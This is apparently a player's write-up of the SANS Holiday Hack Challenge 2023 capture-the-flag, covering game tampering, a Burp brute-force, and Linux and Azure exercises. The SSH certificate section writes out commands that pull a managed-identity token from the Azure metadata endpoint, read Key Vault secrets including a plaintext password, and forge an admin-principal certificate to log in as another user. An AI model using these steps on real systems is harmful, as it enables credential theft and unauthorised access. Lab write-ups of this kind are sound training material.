# S~~ANS~~ Holiday-Hack-Challenge-2023
 
<img width="800" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/d051e195-083b-431e-903d-cc42be8bcb79">  

<div align="center">
 
 
   | Christmas Island | 
   |     :---:      |
   | [Orientation]( )   |
   | [Frosty's Beach](https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/blob/main/README.md#christmas-island-frostys-beach)      |
   | Santa's Surf Shack      |
   | Rudolph's Rest Resort     |
   | Resort Lobby     |
</div>>
## Christmas Island: Orientation
### Holiday Hack Orientation
Difficulty: 🎄

Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands

<details>
<img width="477" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/f446a59b-8aec-4e4f-9a3d-7220f1fc2821">

### Items Gathered
![image](https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/4147c58c-cb62-4135-80d1-ece769d27c12) <b> Fishing Pole - Just a humble rod and reel. Perfect for catching all manner of aquatic life. </b>
</details>

## Christmas Island: Frosty's beach

Hints: Synthesis is the True Ending
From: Santa
The AI revolution has begun. Some of the most prominent and useful tools born from the advent of powerful AI include ChatGPT, PlayHT, Midjourney, Dall-E 3, Bing AI, and Bard, and Grok.

### Snowball Fight
Difficulty: 🎄🎄

Visit Christmas Island and talk to Morcel Nougat about this great new game. Team up with another player and show Morcel how to win against Santa!

<details>
<summary>Solution</summary>
Elves and Santa got you down? Unlock a secret weapon hidden in the game's code: a dwarf named Jared (yes, really) ready to bring the pain!

Here's the cheat code:

Hack the mainframe: Open your dev tools console and flip the 'singlePlayer' switch to 'true'. Think of it as inviting a bearded buddy to your party.
Cue the epic entrance: Prepare for a glorious fanfare as Jared makes his debut, complete with a custom sound effect and toast notification.
Unleash the dwarf power: With Jared on your team, even Santa's belly will jiggle with fear. Those elves won't know what hit them!
Remember: Keep it in the same browser window – no need to open new tabs for this hack.

Get ready to rumble, because this dwarf is about to bring the blizzard!

### Code Analysis:
The code appears to introduce a character (Elf the dwarf, jokingly referred to as Jared) into the game when in single-player mode.First, a sound effect named 'elf_the_dwarf_is_here' is played if audio is enabled. Next, a toast message appears on the screen saying "Elf the dwarf has joined your team!" for a short duration. Finally, a new game sprite named 'jaredSprite' is created at a specific position. All indicating we need the Dwarf.

View the source code of the game 
<img width="739" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/53a6d875-2c45-47e0-bf53-4788b72f4158">


```// Check if it's single-player mode
    // jared ... I mean Elf the dwarf joins the fight when in single player mode
       if (singlePlayer === 'true') {
          setTimeout(() => {
            if (isaudio) {
              gameSceneObject.sound.play('elf_the_dwarf_is_here', { volume: 0.5 });
            }
            toastManager.showToast("Elf the dwarf has joined your team!", duration=500, delay=5000);
            jaredSprite = gameSceneObject.physics.add.sprite(starting_pos.x + 150, starting_pos.y, 'jaredSprite');
```

### Working towards Victory: 
We have to change singlePlayer parameter to true and reload game. 
> [!IMPORTANT]
> Do not play this game in a seperate tab or windows of your browser you have to complete this challenge in the same page with the help of developer tools console.

> https://hhc23-snowball.holidayhackchallenge.com/room/?username=<>&roomId=201e0e461&roomType=public&gameType=co-op&id=18fed30a-a96a-47c2-a697-86c6d3a4b0bb&dna=<>&singlePlayer=false

 <img width="1000" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/3fed0b55-4771-43a1-9045-076875fe1719">

##### Steps:
1. Open Developer console and change the frame to the game room
   
<img width="241" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/634c5fa8-78d0-4b6b-9a04-d4b4a50280cd">

2. Choose play game with random players and once the game room loads check the current loaded URL "window.location.href"
   
3. Use the below javascript which changes the "SinglePlayer" parameter to true and loads the frame again.
  
4. Now you have Dwarf the elf on your team. Playing the game is made easier.

````
// Get the current URL
var url = new URL(window.location.href);

// Update the 'singlePlayer' parameter to 'true'
url.searchParams.set('singlePlayer', 'true');

// Reload the frame with the modified URL
window.location.href = url.href;
````
</details>

## Christmas Island: Frosty's beach

### Linux 101
Difficulty: 🎄🎄
Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with some basic Linux tasks. It's in the southwest corner of Frosty's Beach.

Dust off your Linux beard and let's work on the festive tasks frenzy! 

<details>
<summary>Solution</summary>
 
````
Perform a directory listing of your home directory to find a troll and retrieve a present!
_________________________________________________________________________________________________
elf@5338c71bd631:~$ ls
HELP  troll_19315479765589239  workshop
````
````
Now find the troll inside the troll.
_________________________________________________________________________________________________
elf@5338c71bd631:~$ cat troll_19315479765589239 
troll_24187022596776786
````
````
Great, now remove the troll in your home directory.
_________________________________________________________________________________________________
elf@5338c71bd631:~$ rm troll_19315479765589239
````
````
Print the present working directory using a command.
_________________________________________________________________________________________________
elf@5338c71bd631:~$ pwd
/home/elf
````
````
Good job but it looks like another troll hid itself in your home directory. Find the hidden troll!
_________________________________________________________________________________________________
elf@5338c71bd631:~$ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .profile  .troll_5074624024543078  HELP  workshop
````
````
Now find troll in your command history
_________________________________________________________________________________________________
elf@5338c71bd631:~$ history
````
````
Find the troll in your environment variables.
_________________________________________________________________________________________________
elf@5338c71bd631:~$ env
````
````
Next, head into the workshop.
_________________________________________________________________________________________________
elf@5338c71bd631:~$ cd workshop/
````
````
A troll is hiding in one of the workshop toolboxes. Use "grep" while ignoring case to find which toolbox the troll is in.
_________________________________________________________________________________________________
elf@5338c71bd631:~/workshop$ grep -i "troll" ~/workshop/*
grep: /home/elf/workshop/electrical: Is a directory
/home/elf/workshop/toolbox_191.txt:tRoLl.4056180441832623
````
````
A troll is blocking the present_engine from starting. Run the present_engine binary to retrieve this troll.
_________________________________________________________________________________________________
elf@5338c71bd631:~/workshop$ ls -l  | grep *present*
-r--r--r-- 1 elf elf 4990336 Dec  2 22:19 present_engine
elf@5338c71bd631:~/workshop$ chmod +x present_engine 
elf@5338c71bd631:~/workshop$ ls -l  | grep *present*
-r-xr-xr-x 1 elf elf 4990336 Dec  2 22:19 present_engine
elf@5338c71bd631:~/workshop$ ./present_engine 
troll.898906189498077
````
````
Trolls have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.
_________________________________________________________________________________________________
elf@5338c71bd631:~/workshop$ cd electrical
elf@5338c71bd631:~/workshop/electrical$ ls
blown_fuse0
elf@5338c71bd631:~/workshop/electrical$ mv blown_fuse0 fuse0
elf@5338c71bd631:~/workshop/electrical$ ls
fuse0
````
````
Now, make a symbolic link (symlink) named fuse1 that points to fuse0
_________________________________________________________________________________________________
elf@5338c71bd631:~/workshop/electrical$ ln -s fuse0 fuse1
elf@5338c71bd631:~/workshop/electrical$ ls
fuse0  fuse1
````
````
Make a copy of fuse1 named fuse2.
_________________________________________________________________________________________________
elf@5338c71bd631:~/workshop/electrical$ cp fuse1 fuse2
elf@5338c71bd631:~/workshop/electrical$ ls
fuse0  fuse1  fuse2
````
````
We need to make sure trolls don't come back. Add the characters "TROLL_REPELLENT" into the file fuse2.
_________________________________________________________________________________________________
[elf@5338c71bd631:~/workshop/electrical$ nano fuse2
````
````
Find the troll somewhere in /opt/troll_den.
_________________________________________________________________________________________________
elf@fc2a0ee85df8:/opt/troll_den$ find /opt/troll_den/ -iname '*troll*'
````
````
Find the file somewhere in /opt/troll_den that is owned by the user troll.
_________________________________________________________________________________________________
elf@fc2a0ee85df8:/opt/troll_den$ find /opt/troll_den -type f -user troll
````
````
Find the file created by trolls that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/troll_den.
_________________________________________________________________________________________________
find /opt/troll_den  -size +108k -size -110k
````
````
List the process running
_________________________________________________________________________________________________
elf@fc2a0ee85df8:/opt/troll_den$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
init           1  0.0  0.0  20112 16296 pts/0    Ss+  05:39   0:00 /usr/bin/python3 /usr/local/bin/tmuxp load ./mysession.yaml
elf        14636  0.1  0.1  31520 26736 pts/2    S+   06:04   0:00 /usr/bin/python3 /14516_troll
elf        15593  0.0  0.0   7672  3236 pts/3    R+   06:05   0:00 ps aux
````

````
The 14516_troll process is listening on a TCP port. Use a command to have the only listening port display to the screen.
_________________________________________________________________________________________________
elf@fc2a0ee85df8:/opt/troll_den$ netstat -tuln
````
````
The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last troll.
_________________________________________________________________________________________________
elf@fc2a0ee85df8:/opt/troll_den$ curl 0.0.0.0:54321
````
````
Your final task is to stop the 14516_troll process to collect the remaining presents.
_________________________________________________________________________________________________
elf@fc2a0ee85df8:/opt/troll_den$ kill 14636
````
${\color{pink}Congratulations, you caught all the trolls and retrieved all the presents!
Type "exit" to close...}$

</details>

## Christmas Island: Rudolph's Resort
### Reportinator
Difficulty: 🎄🎄

How well do you know your pentest reports?

<details>
<summary>Solution</summary>
Noel Boetie used ChatNPT to write a pentest report. Go to Christmas Island and help him clean it up.
Reportinator

Ho ho ho! This report's got vulnerabilities listed like Santa's Naughty & Nice. Reading through is always good, but wouldn't a clever trick be nice? There's another way to solve this puzzle, so sharpen your coding elf ears and listen up!

### Technique
There is a POST request with payload data for the 9 questions asked where 1 indicates false and 0 indicates true. With the help of Burpsuite we will first intercept the request and then pass it over to Intruder which would help with all the probable combinations for the correct answer.

#### Steps
1. Load the reportinator webpage and click on submit review directly. You will observe a POST request sent to https://hhc23-reportinator-dot-holidayhack2023.ue.r.appspot.com/check as below

   <img width="359" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/9b70534a-2edc-4f71-af70-a0d7e33613fa">

2. Add payload marker to the value of the parameter input as below. Choose Clusterbomb attack [Check all permutation of payload combination] now fill all the 9 payload set with our combination of 0 and 1.

   <img width="506" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/022888ba-fe19-4c1c-b5bd-8cab0e0021fb">

3. Lauch the attack and observe one of the response will have 200 response status code.

   <img width="547" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/3f5e3ac8-7754-4867-afea-b4734deda8eb">

4. Now work the combination on the report and get the task completed.

</details>

Noel Boetie says "Great job on completing that challenge! Ever thought about how your newfound skills might come into play later on? Keep that mind sharp, and remember, today's victories are tomorrow's strategies!"

It truly does help you later 🤯

### Azure 101
Difficulty: 🎄🎄

Help Sparkle Redberry with some Azure command line skills. Find the elf and the terminal on Christmas Island.

> [!TIP]
> Azure CLI Reference
> 
> From: Sparkle Redberry
> 
> Terminal: Azure 101
> 
> The Azure CLI tools come with a builtin help system, but Microsoft also provides this handy [cheatsheet](https://learn.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest.

Before you get too comfy, why not give your Azure CLI skills a festive brush-up? 

<details>
<summary>Solution</summary>

````
 You may not know this but the Azure cli help messages are very easy to access. First, try typing:
$ az help | less
````
````
Next, you've already been configured with credentials. Use 'az' and your 'account' to 'show' your current details and make sure to pipe to less ( | less )
_________________________________________________________________________________________________
elf@8db4fd157ccd:~$ az account -h list
The client 'f17559a4-d8a2-4661-ba0f-c04f8cf2926d' with object id '8deacb33-214d-4d94-9ab4-d27768410f17' does not have authorization to perform action 'Microsoft.Compute/virtualMachines/read' over scope '/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64' or the scope is invalid. If access was recently granted, please refresh your credentials.
````
````
_________________________________________________________________________________________________
elf@8db4fd157ccd:~$ az account alias show
````
````
_________________________________________________________________________________________________
elf@8db4fd157ccd:~$ az group list
[
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1",
    "location": "eastus",
    "managedBy": null,
    "name": "northpole-rg1",
    "properties": {
      "provisioningState": "Succeeded"
    },
    "tags": {}
  },
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2",
    "location": "westus",
    "managedBy": null,
    "name": "northpole-rg2",
    "properties": {
      "provisioningState": "Succeeded"
    },
    "tags": {}
  }
]
````
````
Ok, now use one of the resource groups to get a list of function apps. For more information:
https://learn.microsoft.com/en-us/cli/azure/functionapp?view=azure-cli-latest
Note: Some of the information returned from this command relates to other cloud assets used by Santa and his elves.
_________________________________________________________________________________________________
elf@8db4fd157ccd:~$ az functionapp list  -g northpole-rg1 | less

[
  {
    "appServicePlanId": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/nor
thpole-rg1/providers/Microsoft.Web/serverfarms/EastUSLinuxDynamicPlan",
    "availabilityState": "Normal",
    "clientAffinityEnabled": false,
    "clientCertEnabled": false,
    "clientCertExclusionPaths": null,
    "clientCertMode": "Required",
    "cloningInfo": null,
    "containerSize": 0,
    "customDomainVerificationId": "201F74B099FA881DB9368A26C8E8B8BB8B9AF75BF450AF717502AC151F59
DBEA",
    "dailyMemoryTimeQuota": 0,
   ** "defaultHostName": "northpole-ssh-certs-fa.azurewebsites.net",**
    "enabled": true,
    "enabledHostNames": [
     ** "northpole-ssh-certs-fa.azurewebsites.net"**
    ],
    "extendedLocation": null,
    "hostNameSslStates": [
      {......................................
        }
    ],
    "hostNames": [
     ** "northpole-ssh-certs-fa.azurewebsites.net"**
    ],
    "hostNamesDisabled": false,
    "hostingEnvironmentProfile": null,
    "httpsOnly": false,
    "hyperV": false,
    **"id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/pro
viders/Microsoft.Web/sites/northpole-ssh-certs-fa",**
    "identity": {
      "principalId": "d3be48a8-0702-407c-89af-0319780a2aea",
      "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
      "type": "SystemAssigned",
      "userAssignedIdentities": null
    },
    "inProgressOperationId": null,
    "isDefaultContainer": null,
    "isXenon": false,
    "keyVaultReferenceIdentity": "SystemAssigned",
    "kind": "functionapp,linux",
    "lastModifiedTimeUtc": "2023-11-09T14:43:01.183333",
    "location": "East US",
    "maxNumberOfWorkers": null,
    "name": "northpole-ssh-certs-fa",
    "outboundIpAddresses": "",
    "possibleOutboundIpAddresses": "",
    "publicNetworkAccess": null,
    "redundancyMode": "None",
   ** "repositorySiteName": "northpole-ssh-certs-fa",**
    "reserved": true,
    "resourceGroup": "northpole-rg1",
    "scmSiteAlsoStopped": false,
    "siteConfig": {
      "acrUseManagedIdentityCreds": false,
      "acrUserManagedIdentityId": null,
      "alwaysOn": false,
      "antivirusScanEnabled": null,
      "apiDefinition": null,
      "apiManagementConfig": null,
      "appCommandLine": null,
      "appSettings": null,
      .
      .
      .
      .
      .
      .
      },
    "slotSwapStatus": null,
    "state": "Running",
    "storageAccountRequired": false,
    "suspendedTill": null,
    "tags": {
      **"create-cert-func-url-path": "/api/create-cert?code=candy-cane-twirl",**
      "project": "northpole-ssh-certs"
    },
    "targetSwapSlot": null,
    "trafficManagerHostNames": null,
    "type": "Microsoft.Web/sites",
    "usageState": "Normal",
    "virtualNetworkSubnetId": null,
    "vnetContentShareEnabled": false,
    "vnetImagePullEnabled": false,
    "vnetRouteAllEnabled": false
  }
]
````
````
Find a way to list the only VM in one of the resource groups you have access to.
For more information:
https://learn.microsoft.com/en-us/cli/azure/vm?view=azure-cli-latest
_________________________________________________________________________________________________
elf@8db4fd157ccd:~$ az vm list -g northpole-rg2 | less

[
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2/providers/Microsoft.Compute/virtualMachines/NP-VM1",
    "location": "eastus",
    "name": "NP-VM1",
    "properties": {
      "hardwareProfile": {
        "vmSize": "Standard_D2s_v3"
      },
      "provisioningState": "Succeeded",
      "storageProfile": {
        "imageReference": {
          "offer": "UbuntuServer",
          "publisher": "Canonical",
          "sku": "16.04-LTS",
          "version": "latest"
        },
        "osDisk": {
          "caching": "ReadWrite",
          "createOption": "FromImage",
          "managedDisk": {
            "storageAccountType": "Standard_LRS"
          },
          "name": "VM1_OsDisk_1"
        }
      },
      "vmId": "e5f16214-18be-4a31-9ebb-2be3a55cfcf7"
    },
    "resourceGroup": "northpole-rg2",
````
````
Find a way to invoke a run-command against the only Virtual Machine (VM) so you can RunShellScript and get a directory listing to reveal a file on the Azure VM.
For more information:
https://learn.microsoft.com/en-us/cli/azure/vm/run-command?view=azure-cli-latest#az-vm-run-command-invoke
_________________________________________________________________________________________________
elf@8db4fd157ccd:~$ az vm run-command invoke -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts 'ls'
{
  "value": [
    {
      "code": "ComponentStatus/StdOut/succeeded",
      "displayStatus": "Provisioning succeeded",
      "level": "Info",
      "message": "bin\netc\nhome\njinglebells\nlib\nlib64\nusr\n",
      "time": 1705438837
    },
    {
      "code": "ComponentStatus/StdErr/succeeded",
      "displayStatus": "Provisioning succeeded",
      "level": "Info",
      "message": "",
      "time": 1705438837
    }
  ]
}
````
${\color{green}Great,you did it all!}$
</details>

## Christmas Island: Resort Lobby
> [!TIP]
> Remember: Pepper Minstix "After you complete all the challenges, come back here for a surprise!"

## Pixel Island: 

### Elf Hunt
Difficulty: 🎄🎄🎄

Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75 points.

> [!TIP]
> JWT Secrets Revealed
> 
> From: Piney Sappington
> 
> Terminal: Elf Hunt
> 
> Unlock the mysteries of JWTs with insights from PortSwigger's JWT Guide.

<details>
<summary>Solution</summary>

JWT Decode and hack! Shortcut or deep dive? Both paths welcome, single-tab battleground, awaits!

## Intended Way
1. Lauch developer console and naviagate to Apllication tab which reveals a cookie for doamin https://elfhunt.org named "ElfHunt_JWT" 
2. Copy the JWT Cookie and navigate to https://token.dev/ when decoded reveals "speed: -500". modify the speddy to -50 and copy the modified JWT token.

### Before Modifying
<img width="668" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/f218cdac-14bb-4726-8635-978aa3adf9f3">

### After modifying
<img width="656" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/c71f2210-c789-46e8-b80b-60e9b6c103b4">

3. Go to developer console --> Application --> Cookies --> https://elfhunt.org.
4. Right click edit value and paste the new token.
5. Since all of this have to be done within the same tab. After modifying the token Go to developer console --> select elfhung.org and then type window.location.reload(); which will reload the iframe where hte game is loaded.

<img width="501" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/e210d1c5-e58d-4223-949e-685145377944">

6. Now observe the elves are moving very slow which makes it easy to shoot and score above 75.
7. Upon wining the challenge we get a note which belongs to Alabaster Snowball 
   
   <img width="339" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/81cf67de-301f-4db7-b3ee-d308474ab458">

## Alternative Way

On the source code of the elf challenge we can see that there is a variable called score. If the score is 75 or higher, it updates the sessionJWT and stores it in a cookie. It pauses the game scene. So let's set the score as 80 and we win the game.

<img width="834" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/3537280c-5134-4f16-b28c-049f4121b315">


</details>

### Certificate SSHenanigans
Difficulty: 🎄🎄🎄🎄🎄

Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure [Function App](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl) . What type of cookie cache is Alabaster planning to implement?

Certifiably Secure & Slightly Shell-arious. A Whimsical Intro to Secure Shell Certificates
Speaker(s): Thomas Bouve
A practical introduction to secure shell certificates and how to upgrade your existing SSH server configuration.
[Click here to watch this talk!](https://www.youtube.com/watch?v=4S0Rniyidt4)

<details>
<summary>Solution</summary>

The tasks gives an idea on how to use SSH certificate to authenticate to a remote server.

Alabaster introduces his gleaming Azure server at ssh-server-vm.santaworkshopgeeseislands.org. Inspired by ChatNPT's ingenious suggestion to upgrade using SSH certificates, Alabaster is eager to share the magic. 

${\color{green}"Generate a certificate," he suggests, "use the monitor account to access the host, and let me know if my TODO list is within reach."}$
 
1. Let's create a SSH certificate from the machine which would use to access the server.
   
   <img width="441" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/f4ed0c57-b6c0-498a-9f84-c87a1812dead">


2. Now copy the public key contents and paste it in https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl. The certificate will be signed and response would have the signed pub key.

<img width="687" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/e6ebc809-4564-4ca3-a6e7-e08a3ad4e852">


3. Copy only the necessary portion of the certificate highlighted in blue and now update your exisiting certificate using the new signed pub key.

<img width="950" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/0698166a-fa23-4564-9de6-593bdb47262a">

4. Now SSH to the remote server with the private key using the monitor account.

````
   ┌──(kali㉿kali)-[~/SSHenanigans]
└─$ ssh -i moni monitor@ssh-server-vm.santaworkshopgeeseislands.org 
monitor@ssh-server-vm:~$ whoami
monitor
````
5. The below hint shows that we have to gather information using the Azure Web/Function App deployed in the server hence let's start with that.

> [!TIP]
> Azure Function App Source Code
> From: Alabaster Snowball
> Objective: Certificate SSHenanigans
> The [get-source-control](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01) Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from.

6. One  of our previous Task "Azure 101" we found a function app so that could be a good start. 

````
elf@8db4fd157ccd:~$ az functionapp list  -g northpole-rg1 | less

[
  {
    "appServicePlanId": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/nor
thpole-rg1/providers/Microsoft.Web/serverfarms/EastUSLinuxDynamicPlan",
    "availabilityState": "Normal",
    "clientAffinityEnabled": false,
    "clientCertEnabled": false,
    "clientCertExclusionPaths": null,
    "clientCertMode": "Required",
    "cloningInfo": null,
    "containerSize": 0,
    "customDomainVerificationId": "201F74B099FA881DB9368A26C8E8B8BB8B9AF75BF450AF717502AC151F59
DBEA",
    "dailyMemoryTimeQuota": 0,
   **"defaultHostName": "northpole-ssh-certs-fa.azurewebsites.net",**
    "enabled": true,
    "enabledHostNames": [
     **"northpole-ssh-certs-fa.azurewebsites.net"**
    ],
    "extendedLocation": null,
    "hostNameSslStates": [
      {......................................
        }
    ],
    "hostNames": [
     **"northpole-ssh-certs-fa.azurewebsites.net"**
    ],
    "hostNamesDisabled": false,
    "hostingEnvironmentProfile": null,
    "httpsOnly": false,
    "hyperV": false,
    **"id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/pro
viders/Microsoft.Web/sites/northpole-ssh-certs-fa",**
    "identity": {
      "principalId": "d3be48a8-0702-407c-89af-0319780a2aea",
      "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
      "type": "SystemAssigned",
      "userAssignedIdentities": null
    },
````

7. Since AZI CLI is not in the host we use CURL and it retured me an error that the authorization header is missing.
  The header should look like: "Authorization: Bearer <your-access-token>"

````    
monitor@ssh-server-vm:/home$ curl -X GET "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   115  100   115    0     0    603      0 --:--:-- --:--:-- --:--:--   602
{
  "error": {
    "code": "AuthenticationFailed",
    "message": "Authentication failed. The 'Authorization' header is missing."
  }
}
````

Reference: 
https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token#get-a-token-using-curl

````
monitor@ssh-server-vm:/home$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq
{
  "access_token": "eyJ0eXAiOiJKV1Q******************cig",
  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
  "expires_in": "84827",
  "expires_on": "1705609969",
  "ext_expires_in": "86399",
  "not_before": "1705523269",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
````
8. For ease the token has been assigned to a variable az_token and the curl request was sent again, we see a github repo url over there.

````
monitor@ssh-server-vm:/home$ curl -X GET "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01" \
-H "Authorization: Bearer $az_token" | jq
 ````

9. After reading throught the python file the Key vault got me curious and let's find the vault URL probably that's were the TODO List lies. We have the Vault URL by running below command

Reveals Vault URL
````
monitor@ssh-server-vm:/usr$ curl -H "Authorization: Bearer $az_token" -X GET "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01" | jq
````
Generate a token for vault.azure.net to access content in Vault URL
````
monitor@ssh-server-vm:~$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s | jq
````
Reveals Secret path
````
monitor@ssh-server-vm:~$ curl -H "Authorization: Bearer $az_vault" -X GET "https://northpole-it-kv.vault.azure.net/secrets?api-version=2016-10-01" | jq
````
Reveals secrets in the Vault 
````
monitor@ssh-server-vm:~$ curl -H "Authorization: Bearer $az_vault" -X GET "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=2016-10-01" | jq
````

Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru

************ The END this lead me no where for now ***************************************************************

Let's relook again what to do to get the TODO List 🤨

10. I had a look at the function app python code and got curious about "principal". The video of Thomas Bouve gives information about principals and that got me to verify that alabaster has pricipal as admin and monitor has prinicipal as elf. So we have to create a SSH certificate with principal as elf.  

````
monitor@ssh-server-vm:/etc/ssh/auth_principals$ ls
alabaster  monitor
monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat alabaster 
admin
monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat monitor
elf
````
11. Revisiting the [portal](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl) and looked at the response which had a parameter "principal". How about we try the "principal" as admin in the request and see if the response shows the principal as admin.

<img width="740" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/35022dca-21be-4430-83de-90ba915a695f">

Sure, it did now we have a SSH certificate with admin principal so we can SSH as alabaster into the host ssh-server-vm.santaworkshopgeeseislands.org.

12. Modify the exisiting public key with the newly generated public key and SSH into the server as alabaster. List the content in home directory and finally we have the TODO List.

````
 ┌──(kali㉿kali)-[~/SSHenanigans]
└─$ ssh -i moni alabaster@ssh-server-vm.santaworkshopgeeseislands.org
alabaster@ssh-server-vm:~$ 
````
````
┌──(kali㉿kali)-[~/SSHenanigans]
└─$ ssh -i moni alabaster@ssh-server-vm.santaworkshopgeeseislands.org
alabaster@ssh-server-vm:~$ ls
alabaster_todo.md  impacket
alabaster@ssh-server-vm:~$ cat alabaster_todo.md 
# Geese Islands IT & Security Todo List

- [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
````
As per the TODO List Alabster is planning to implement ${\color{green}Gingerbread}$  cookie cache 🍪 
</details>

### Active Directory
Difficult: 🎄🎄🎄🎄

Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?

> [!TIP]
> Misconfiguration ADventures
> From: Alabaster Snowball
> Objective: Active Directory
> Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.

<details>
 <summary>Solution</summary>

Ribb Bonbowford (Coggoggle Marina)
Hello, I'm Ribb Bonbowford. Nice to meet you!

I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files.

I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data.

Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.

